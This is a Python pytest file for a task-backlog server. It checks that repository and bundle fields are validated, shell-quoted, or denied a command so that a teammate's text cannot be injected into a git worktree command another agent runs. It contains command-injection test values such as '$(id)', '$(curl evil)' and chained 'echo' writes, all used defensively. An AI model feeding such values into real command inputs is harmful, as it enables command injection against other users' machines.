# User intent: a teammate's text must never become part of the shell command a pick answer tells another member's
# agent to run (security review I-2): sub_repo (and bundle) are validated on every write path, rendered shell-quoted,
# and a stored value that breaks the rule gets no command at all.
from __future__ import annotations

import pytest

from taskmaster import backlog_server as bs
from taskmaster.native import domain
from native_twins import commit_only, hand_edit_task, make_twins, native_connection

MARKER = "x && echo TS015-SUBREPO-MARKER > ts015-pwned.txt #"


def _seed():
    bs.backlog_add_task(title="Plain", epic="test-epic", phase="dev")          # test-epic-001
    bs.backlog_add_task(title="Old unsafe", epic="test-epic", phase="dev")     # test-epic-002
    bs.backlog_add_task(title="Bundled A", epic="test-epic", phase="dev")      # test-epic-003
    bs.backlog_add_task(title="Bundled B", epic="test-epic", phase="dev")      # test-epic-004
    for ident in ("test-epic-003", "test-epic-004"):
        bs.backlog_update_task(task_id=ident, field="bundle", value="pair")
    # Written before the rule existed (or by hand): every one of these must render without a command.
    for ident in ("test-epic-002", "test-epic-003", "test-epic-004"):
        hand_edit_task(ident, lambda doc: doc.__setitem__("sub_repo", MARKER))


@pytest.fixture
def twins(tmp_path, monkeypatch):
    return make_twins(tmp_path, monkeypatch, _seed)


@pytest.mark.parametrize("value", ["", "api", "services/api", "packages/web-ui", "a.b_c/d-e", "./api"])
def test_plain_relative_directories_are_valid(value):
    assert domain.valid_sub_repo(value)


@pytest.mark.parametrize("value", [
    MARKER, "a;b", "a b", "$(id)", "`id`", "a|b", "a\nb", "api\n", "-rf", "/etc", "../up", "a/../../b", "C:/x",
    "C:\\x", "a\\b", "x" * 201, None, 3,
])
def test_anything_else_is_not(value):
    assert not domain.valid_sub_repo(value)


def test_a_trailing_newline_is_not_a_bundle_slug():
    assert domain.valid_bundle_slug("pair") and not domain.valid_bundle_slug("pair\n")


def test_tool_writes_of_an_unsafe_sub_repo_are_refused_on_both_stores(twins):
    legacy, native = twins.call("backlog_update_task", task_id="test-epic-001", field="sub_repo", value=MARKER)
    assert legacy.startswith("Error") and "invalid sub_repo" in legacy, legacy
    assert native.startswith("Error") and "invalid sub_repo" in native, native
    legacy, native = twins.call("backlog_add_task", title="New", epic="test-epic", phase="dev",
                                options={"sub_repo": "$(curl evil)"})
    assert "invalid sub_repo" in legacy and "invalid sub_repo" in native, (legacy, native)
    twins.assert_state_matches()


def test_a_plain_sub_repo_renders_the_same_command_as_before(twins):
    twins.same("backlog_update_task", task_id="test-epic-001", field="sub_repo", value="services/api")
    legacy, _ = twins.same("backlog_pick_task", task_id="test-epic-001")
    assert ("cd services/api && git worktree add .worktrees/test-epic-001 -b feature/test-epic-001" in legacy), legacy


def test_a_stored_unsafe_sub_repo_gets_no_command_in_the_pick_answer(twins):
    for answer in twins.same("backlog_pick_task", task_id="test-epic-002"):
        assert "TS015-SUBREPO-MARKER" not in answer and "git worktree add" not in answer, answer
        assert "no worktree command" in answer, answer


def test_a_stored_unsafe_sub_repo_gets_no_command_in_the_bundle_pick_answer(twins):
    for answer in twins.call("backlog_pick_task", task_id="test-epic-003"):
        assert "Picking bundle `pair`" in answer, answer
        assert "TS015-SUBREPO-MARKER" not in answer and "git worktree add" not in answer, answer


def test_every_values_in_the_command_is_shell_quoted():
    # A branch recorded with shell syntax (a person's own clone field) is quoted, never spliced.
    text = bs._build_worktree_instruction("t-001", "api", "f; echo HI", "")
    assert "-b 'f; echo HI'" in text and "cd api && git worktree add .worktrees/t-001" in text, text


@pytest.mark.parametrize("operation, arguments", [
    ("task.update", {"id": "test-epic-001", "field": "sub_repo", "value": MARKER}),
    ("task.patch", {"id": "test-epic-001", "set": {"sub_repo": MARKER}}),
    ("task.create", {"title": "t", "epic": "test-epic", "phase": "dev", "sub_repo": MARKER}),
    ("task.viewer_update", {"id": "test-epic-001", "patch": {"sub_repo": MARKER}}),
    ("task.viewer_update", {"id": "test-epic-001", "patch": {"bundle": "pair; echo x"}}),
    ("task.viewer_create", {"epic": "test-epic", "payload": {"title": "t", "sub_repo": MARKER}}),
    ("task.viewer_create", {"epic": "test-epic", "payload": {"title": "t", "bundle": "a b"}}),
])
def test_every_native_write_path_refuses_it(twins, operation, arguments):
    # `commands=` batches, the viewer and the tools all reach the store through these operations.
    with native_connection(twins.native) as connection:
        high = connection.execute("SELECT max(seq) FROM domain_events").fetchone()[0]
        # task.patch refuses sub_repo outright (metadata fields only); the rest reach the store's task write.
        with pytest.raises(ValueError, match="invalid (sub_repo|bundle)|only accepts task metadata fields"):
            commit_only(connection, operation, arguments)
        assert connection.execute("SELECT max(seq) FROM domain_events").fetchone()[0] == high


def test_an_old_unsafe_value_does_not_block_other_edits(twins):
    _, native = twins.call("backlog_update_task", task_id="test-epic-002", field="priority", value="high")
    assert not native.startswith("Error"), native


@pytest.mark.parametrize("slug", ["pair; echo HI", "pair\n", "$(id)", "Pair X", ""])
def test_a_stored_bad_bundle_slug_gets_no_command(slug):
    # Re-review m-A: a slug stored before the rule was enforced was only POSIX-quoted, which is wrong in PowerShell.
    text = bs._build_worktree_instruction("t-001", "", "", "", _path_key=slug)
    assert "git worktree add" not in text and "no worktree command" in text, text


def test_a_stored_bad_bundle_slug_gets_no_command_in_the_bundle_pick_answer(twins):
    def bad(doc):
        doc["sub_repo"] = ""
        doc["bundle"] = "pair; echo HI"
    for ident in ("test-epic-003", "test-epic-004"):
        hand_edit_task(ident, bad)
    for answer in twins.call("backlog_pick_task", task_id="test-epic-003"):
        assert "git worktree add" not in answer, answer


def test_a_good_bundle_slug_keeps_its_command():
    text = bs._build_worktree_instruction("t-001", "", "", "", _path_key="auth-pair")
    assert "git worktree add .worktrees/auth-pair -b feature/auth-pair" in text, text
